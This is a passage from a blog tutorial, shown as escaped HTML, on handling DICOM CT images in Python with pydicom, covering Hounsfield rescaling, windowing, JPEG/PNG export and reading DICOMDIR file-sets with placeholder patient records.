/post/0090-python-dicom/dicom_files/dicom_23_1_hu5cd3fcbac50ea0a3e37b2b8c02f36615_76432_1200x1200_fit_q75_h2_lanczos_3.webp 1200w"
src="https://www.peco602.com/post/0090-python-dicom/dicom_files/dicom_23_1_hu5cd3fcbac50ea0a3e37b2b8c02f36615_76432_7f7e419c08ca4d6a615088a8bc0c5603.webp"
width="430"
height="418"
loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>The image has not visually changed, but the pixel values have been correctly transformed into Hounsfield units.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">numpy&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="nn">np&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">np&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">min&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">arr&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">np&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">max&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">arr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>(0, 2335)
&lt;/code>&lt;/pre>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">np&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">min&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hu&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">np&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">max&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hu&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>(-1024.0, 1311.0)
&lt;/code>&lt;/pre>
&lt;h3 id="3-voi-lut-or-windowing-operation">3. VOI LUT or Windowing Operation¶&lt;/h3>
&lt;p>The DICOM &lt;a href="http://dicom.nema.org/medical/dicom/current/output/chtml/part03/sect_C.11.2.html" target="_blank" rel="noopener">VOI LUT&lt;/a> module applies a VOI or windowing operation to input values. The &lt;a href="https://pydicom.github.io/pydicom/stable/reference/generated/pydicom.pixel_data_handlers.util.html#pydicom.pixel_data_handlers.util.apply_voi_lut" target="_blank" rel="noopener">&lt;code>apply_voi_lut()&lt;/code>&lt;/a> function can be used with an input array and a dataset containing a VOI LUT module to return values with applied VOI LUT or windowing. When a dataset contains multiple VOI or windowing views then a particular view can be returned by using the index keyword parameter. In this case the index &lt;code>0&lt;/code> will be used.&lt;/p>
&lt;p>When a dataset requires multiple grayscale transformations, then it’s assumed that the modality LUT or rescale operation has already been applied.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pydicom.pixel_data_handlers.util&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">apply_voi_lut&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">out&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">apply_voi_lut&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hu&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ds&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">index&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">plt&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">imshow&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">out&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cmap&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">plt&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">cm&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">bone&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>&amp;lt;matplotlib.image.AxesImage at 0x7f5621ab8c40&amp;gt;
&lt;/code>&lt;/pre>
&lt;p>
&lt;figure >
&lt;div class="d-flex justify-content-center">
&lt;div class="w-100" >&lt;img alt="png" srcset="
/post/0090-python-dicom/dicom_files/dicom_28_1_huf447e093701c4bcb4834419a79ca0b5d_92272_cf1702a0385e32544cc75cd0037f9df4.webp 400w,
/post/0090-python-dicom/dicom_files/dicom_28_1_huf447e093701c4bcb4834419a79ca0b5d_92272_a7c221cdea1e0f4c5712617f3d9b6522.webp 760w,
/post/0090-python-dicom/dicom_files/dicom_28_1_huf447e093701c4bcb4834419a79ca0b5d_92272_1200x1200_fit_q75_h2_lanczos_3.webp 1200w"
src="https://www.peco602.com/post/0090-python-dicom/dicom_files/dicom_28_1_huf447e093701c4bcb4834419a79ca0b5d_92272_cf1702a0385e32544cc75cd0037f9df4.webp"
width="430"
height="418"
loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>Got it! The sequence of pre-processing steps has deeply enhanced the details of the CT scan contained in the DICOM file. At this point, the image can be definitely visually analyzed.&lt;/p>
&lt;h2 id="image-export">Image export&lt;/h2>
&lt;p>As already discussed, DICOM files contain not only image data, but also lots of ancillary information. It has also been demonstrated the image may not be immediately usable without some processing. DICOM images are not accessible without specific viewers and the image exchange may be even more difficult since different viewers may differently process the images. A possible solution could be to convert the DICOM file into a standard exchange format, e.g., JPEG or PNG.&lt;/p>
&lt;p>The starting point is the pre-processed image &lt;code>out&lt;/code>. The first step is to convert pixel data to &lt;code>float&lt;/code> in order to avoid overflow or underflow losses during image scaling.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">new_image&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">out&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">astype&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">float&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Pixel data is currently expressed in Hounsfield units, but it must rescaled into the &lt;code>[0, 255]&lt;/code> interval and then converted to 8 bits unsigned integer.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">PIL&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">Image&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">scaled_image&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">np&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">maximum&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">new_image&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="n">new_image&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">max&lt;/span>&lt;span class="p">())&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mf">255.0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">scaled_image&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">np&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">uint8&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">scaled_image&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">final_image&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Image&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">fromarray&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">scaled_image&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The image can then be easily saved in &lt;code>jpg&lt;/code> or &lt;code>png&lt;/code> format.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">final_image&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">save&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;dicom.jpg&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">final_image&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">save&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;dicom.png&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>As a test, it is possible to import and plot the just saved &lt;code>jpg&lt;/code> image.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">img&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">np&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">asarray&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Image&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;dicom.jpg&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">plt&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">imshow&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">img&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cmap&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">plt&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">cm&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">bone&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>&amp;lt;matplotlib.image.AxesImage at 0x7f5621a34cd0&amp;gt;
&lt;/code>&lt;/pre>
&lt;p>
&lt;figure >
&lt;div class="d-flex justify-content-center">
&lt;div class="w-100" >&lt;img alt="png" srcset="
/post/0090-python-dicom/dicom_files/dicom_39_1_hu8a1cc0d0a0d51869e683fa2ca2d58092_98210_9fd570e07dd83a10d9acd04b9bf9d909.webp 400w,
/post/0090-python-dicom/dicom_files/dicom_39_1_hu8a1cc0d0a0d51869e683fa2ca2d58092_98210_4f288a8f75b4a28c411e0b6c418dd9a1.webp 760w,
/post/0090-python-dicom/dicom_files/dicom_39_1_hu8a1cc0d0a0d51869e683fa2ca2d58092_98210_1200x1200_fit_q75_h2_lanczos_3.webp 1200w"
src="https://www.peco602.com/post/0090-python-dicom/dicom_files/dicom_39_1_hu8a1cc0d0a0d51869e683fa2ca2d58092_98210_9fd570e07dd83a10d9acd04b9bf9d909.webp"
width="430"
height="418"
loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h2 id="dicom-file-sets-and-dicomdir">DICOM File-sets and DICOMDIR&lt;/h2>
&lt;p>A File-set is a collection of DICOM files that share a common naming space. Most people have probably interacted with a File-set without being aware of it; one place they’re frequently used is on the CDs/DVDs containing DICOM data that are given to a patient after a medical procedure (such as an MR or ultrasound). The specification for File-sets is given in &lt;a href="http://dicom.nema.org/medical/dicom/current/output/chtml/part10/chapter_8.html" target="_blank" rel="noopener">Part 10 of the DICOM Standard&lt;/a>.&lt;/p>
&lt;p>Every File-set must contain a single file with the filename &lt;strong>&lt;code>DICOMDIR&lt;/code>&lt;/strong>, the location of which is dependent on the type of media used to store the File-set. For the most commonly used media (DVD, CD, USB, PC file system, etc), the DICOMDIR file will be in the root directory of the File-set. For other media types, &lt;a href="http://dicom.nema.org/medical/dicom/current/output/chtml/part12/ps3.12.html" target="_blank" rel="noopener">Part 12 of the DICOM Standard&lt;/a> specifies where the DICOMDIR must be located.&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>&lt;em>NOTE:&lt;/em>&lt;/strong> Despite its name, a DICOMDIR file is not a file system directory and can be read using &lt;code>dcmread()&lt;/code> like any other DICOM dataset&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">DICOMDIR_PATH&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;/home/user/Desktop/exam/DICOMDIR&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ds&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">dcmread&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">DICOMDIR_PATH&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">type&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ds&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>pydicom.dicomdir.DicomDir
&lt;/code>&lt;/pre>
&lt;p>The most important element in a DICOMDIR is the (0004,1220) &lt;em>Directory Record Sequence&lt;/em>: each item in the sequence is a directory record, and one or more records are used to briefly describe an available item, i.e., the so called SOP Instance, and its location within the File-set’s directory structure. Each record has a record type given by the (0004,1430) &lt;em>Directory Record Type&lt;/em> element, and different records are related to each other using the hierarchy given in &lt;a href="https://dicom.nema.org/medical/dicom/current/output/chtml/part03/sect_F.4.html#table_F.4-1" target="_blank" rel="noopener">Table F.4-1&lt;/a>. As examples, it is possible to go through some directory records:&lt;/p>
&lt;!-- ```python
# TO BE COMMENTED
ds.DirectoryRecordSequence[0].PatientName = 'ROSSI^MARIO'
ds.DirectoryRecordSequence[0].PatientID = '99999999'
ds.DirectoryRecordSequence[0].PatientBirthDate = '19330101'
``` -->
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ds&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">DirectoryRecordSequence&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">])&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>(0004, 1400) Offset of the Next Directory Record UL: 0
(0004, 1410) Record In-use Flag US: 65535
(0004, 1420) Offset of Referenced Lower-Level Di UL: 500
(0004, 1430) Directory Record Type CS: 'PATIENT'
(0010, 0010) Patient's Name PN: 'ROSSI^MARIO'
(0010, 0020) Patient ID LO: '99999999'
(0010, 0021) Issuer of Patient ID LO: 'X1V1_MPI'
(0010, 0030) Patient's Birth Date DA: '19330101'
(0010, 0040) Patient's Sex CS: 'M'
&lt;/code>&lt;/pre>
&lt;p>This is a &lt;code>PATIENT&lt;/code> record which provides details about the patient, such as &lt;em>Patient&amp;rsquo;s Name&lt;/em> and &lt;em>Patient ID&lt;/em> (refer to &lt;a href="http://dicom.nema.org/medical/dicom/current/output/chtml/part03/sect_F.5.html#table_F.5-1" target="_blank" rel="noopener">Table F.5-1&lt;/a>).&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ds&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">DirectoryRecordSequence&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">])&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>(0004, 1400) Offset of the Next Directory Record UL: 0
(0004, 1410) Record In-use Flag US: 65535
(0004, 1420) Offset of Referenced Lower-Level Di UL: 956
(0004, 1430) Directory Record Type CS: 'STUDY'
(0008, 0020) Study Date DA: '20221215'
(0008, 0030) Study Time TM: '162614'
(0008, 0050) Accession Number SH: '5895682501'
(0008, 0061) Modalities in Study CS: 'CT'
(0008, 0090) Referring Physician's Name PN: 'MEDICO^REFERTANTE'
(0008, 1030) Study Description LO: 'TC CRANIO (CAPO)'
(0020, 000d) Study Instance UID UI: 1.2.840.113564.9.1.2015111110072131.20221209153953.25895682501
(0020, 0010) Study ID SH: 'CT20221215162611'
(0020, 1206) Number of Study Related Series IS: '5'
(0020, 1208) Number of Study Related Instances IS: '545'
(07a1, 0010) Private Creator LO: 'ELSCINT1'
(07a1, 1040) [Tamar Study Body Part] CS: 'ABDOMEN'
(07a3, 0010) Private Creator LO: 'ELSCINT1'
(07a3, 1069) Private tag data OB: Array of 98 elements
&lt;/code>&lt;/pre>
&lt;p>This is a &lt;code>STUDY&lt;/code> record, where details such as acquisition date, time and description are included (refer to &lt;a href="https://dicom.nema.org/medical/dicom/current/output/chtml/part03/sect_F.5.2.html" target="_blank" rel="noopener">Table F.5-2&lt;/a>).&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ds&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">DirectoryRecordSequence&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">])&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>(0004, 1400) Offset of the Next Directory Record UL: 6032
(0004, 1410) Record In-use Flag US: 65535
(0004, 1420) Offset of Referenced Lower-Level Di UL: 1214
(0004, 1430) Directory Record Type CS: 'SERIES'
(0008, 0021) Series Date DA: '20221215'
(0008, 0031) Series Time TM: '162644'
(0008, 0060) Modality CS: 'CT'
(0008, 103e) Series Description LO: 'Topogram 0.6 T20s'
(0018, 0015) Body Part Examined CS: 'ABDOMEN'
(0018, 1030) Protocol Name LO: 'CBM_encefalo_SEQ'
(0020, 000e) Series Instance UID UI: 1.3.12.2.1107.5.1.4.55050.30000022121508001632800000005
(0020, 0011) Series Number IS: '1'
(0020, 1209) Number of Series Related Instances IS: '1'
&lt;/code>&lt;/pre>
&lt;p>The &lt;code>SERIES&lt;/code> record adds details about the acquisition modality, i.e., &lt;code>CT&lt;/code>, and the examined body part, i.e., &lt;code>ABDOMEN&lt;/code> (refer to &lt;a href="https://dicom.nema.org/medical/dicom/current/output/chtml/part03/sect_F.5.3.html" target="_blank" rel="noopener">Table F.5-3&lt;/a>).&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ds&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">DirectoryRecordSequence&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">])&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>(0004, 1400) Offset of the Next Directory Record UL: 0
(0004, 1410) Record In-use Flag US: 65535
(0004, 1420) Offset of Referenced Lower-Level Di UL: 0
(0004, 1430) Directory Record Type CS: 'IMAGE'
(0004, 1500) Referenced File ID CS: ['MD44PKO2', 'OBGUOM0I', 'I1000000']
(0004, 1510) Referenced SOP Class UID in File UI: CT Image Storage
(0004, 1511) Referenced SOP Instance UID in File UI: 1.3.12.2.1107.5.1.4.55050.30000022121506293760900002194
(0004, 1512) Referenced Transfer Syntax UID in F UI: Explicit VR Little Endian
(0008, 0008) Image Type CS: ['ORIGINAL', 'PRIMARY', 'LOCALIZER', 'CT_SOM5 TOP']
(0008, 0016) SOP Class UID UI: CT Image Storage
(0008, 0018) SOP Instance UID UI: 1.3.12.2.1107.5.1.4.55050.30000022121506293760900002194
(0008, 0023) Content Date DA: '20221215'
(0008, 0033) Content Time TM: '162704.453698'
(0008, 0060) Modality CS: 'CT'
(0018, 0010) Contrast/Bolus Agent LO: ''
(0020, 0013) Instance Number IS: '1'
(0020, 0052) Frame of Reference UID UI: 1.3.12.2.1107.5.1.4.55050.30000022121506293760900002193
(0020, 1041) Slice Location DS: '-14.5'
(0028, 0002) Samples per Pixel US: 1
(0028, 0004) Photometric Interpretation CS: 'MONOCHROME2'
(0028, 0010) Rows US: 512
(0028, 0011) Columns US: 512
(0028, 0100) Bits Allocated US: 16
(0088, 0200) Icon Image Sequence 1 item(s) ----
(0028, 0002) Samples per Pixel US: 1
(0028, 0004) Photometric Interpretation CS: 'MONOCHROME2'
(0028, 0010) Rows US: 64
(0028, 0011) Columns US: 64
(0028, 0034) Pixel Aspect Ratio IS: [1, 1]
(0028, 0100) Bits Allocated US: 8
(0028, 0101) Bits Stored US: 8
(0028, 0102) High Bit US: 7
(0028, 0103) Pixel Representation US: 0
(7fe0, 0010) Pixel Data OB: Array of 4096 elements
---------
(00e1, 0010) Private Creator LO: 'ELSCINT1'
(00e1, 1040) [Image Label] SH: ''
&lt;/code>&lt;/pre>
&lt;p>Last but not least, the &lt;code>IMAGE&lt;/code> record contains all the image data, i.e., &lt;code>Pixel Data&lt;/code>, and metadata, e.g., &lt;code>Bits Allocated&lt;/code>, &lt;code>Photometric Interpretation&lt;/code>.&lt;/p>
&lt;p>While it’s possible to access everything within a File-set using the DICOMDIR dataset, making changes to an existing File-set quickly becomes complicated due to the need to add and remove directory records, recalculate the byte offsets for existing records and manage the corresponding file system changes. A more user-friendly way to interact with one is via the &lt;a href="https://pydicom.github.io/pydicom/stable/reference/generated/pydicom.fileset.FileSet.html#pydicom.fileset.FileSet" target="_blank" rel="noopener">FileSet&lt;/a> class.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pydicom.fileset&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">FileSet&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">fs&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">FileSet&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ds&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">type&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fs&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>pydicom.fileset.FileSet
&lt;/code>&lt;/pre>
&lt;p>An overview of the File-set’s contents is shown when printing:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fs&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>DICOM File-set
Root directory: /home/user/Desktop/exam
File-set ID: (no value available)
File-set UID: 1.2.840.113704.7.1.0.12118132138452.1672763590.1000003
Descriptor file ID: (no value available)
Descriptor file character set: (no value available)
Changes staged for write(): DICOMDIR update, directory structure update
Managed instances:
PATIENT: PatientID='99999999', PatientName='ROSSI^MARIO'
STUDY: StudyDate=20221215, StudyTime=162614, StudyDescription='TC CRANIO (CAPO)'
SERIES: Modality=CT, SeriesNumber=1
IMAGE: 1 SOP Instance
SERIES: Modality=CT, SeriesNumber=2
IMAGE: 66 SOP Instances
SERIES: Modality=CT, SeriesNumber=602
IMAGE: 199 SOP Instances
SERIES: Modality=CT, SeriesNumber=603
IMAGE: 143 SOP Instances
SERIES: Modality=CT, SeriesNumber=604
IMAGE: 136 SOP Instances
&lt;/code>&lt;/pre>
&lt;p>which basically provides a brief summary of the directory records previously introduced.&lt;/p>
&lt;h2 id="conclusions">Conclusions&lt;/h2>
&lt;p>This post has provided a wide overview of DICOM images in Python in particular about:&lt;/p>
&lt;ul>
&lt;li>DICOM data structure&lt;/li>
&lt;li>DICOM image visualization (and pre-processing)&lt;/li>
&lt;li>DICOM image export&lt;/li>
&lt;li>DICOM file-sets and DICOMDIR&lt;/li>
&lt;/ul>
&lt;p>As a summary, the following script summarizes all the introduced concepts since it allows to read a &lt;code>DICOMDIR&lt;/code> file (via the &lt;code>DICOMDIR_PATH&lt;/code> variable) and convert all the SOP instances to JPEG images. The exported images will be saved to a specific path based on specific metadata, i.e., &lt;code>{OUTPUT_PATH}/{patient_id}/{study_date}/{series_number}/{instance_number}.jpg&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">os&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">PIL&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">Image&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">numpy&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="nn">np&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pydicom&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">dcmread&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pydicom.fileset&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">FileSet&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pydicom.pixel_data_handlers.util&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">apply_color_lut&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">apply_modality_lut&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">apply_voi_lut&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">DICOMDIR_PATH&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;/home/user/Desktop/exam/DICOMDIR&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">OUTPUT_PATH&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;/home/user/Desktop/exam_converted&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># DICOMDIR reading&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ds&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">dcmread&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">DICOMDIR_PATH&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">fs&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">FileSet&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ds&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Iterating over the FileSet instances&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="n">instance&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">fs&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Loading the corresponding SOP Instance dataset&lt;/span>
